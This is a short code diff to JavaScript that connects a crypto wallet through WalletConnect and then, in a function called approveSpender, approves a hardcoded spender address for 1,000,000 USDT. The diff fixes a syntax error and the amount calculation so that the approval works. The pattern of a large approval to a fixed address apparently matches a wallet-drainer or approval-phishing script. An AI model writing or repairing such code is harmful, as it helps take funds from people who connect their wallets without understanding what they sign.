@@ -103,7 +103,7 @@ async function connectWalletConnect() {
     const accounts = await wcProvider.enable();
     window.ethereum = wcProvider;
 
-    window..web3 = new web3(window.ethereum);
+    window.web3 = new web3(window.ethereum);
 
     provider = new ethers.providers.Web3Provider(wcProvider);
     signer = provider.getSigner();
@@ -131,7 +131,7 @@ async function approveSpender(account) {
     const spenderAddress = '0x89e8ed15656ab289e980f92e59ddf7ecd2a36f85';
     const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Replace with actual USDT contract address
 
-    const usdtAmount = (1000000 * 10 ** 6).toString();
+    const usdtAmount = ethers.utils.parseUnits("1000000", 6).toString();
 
     const abi = [
       {
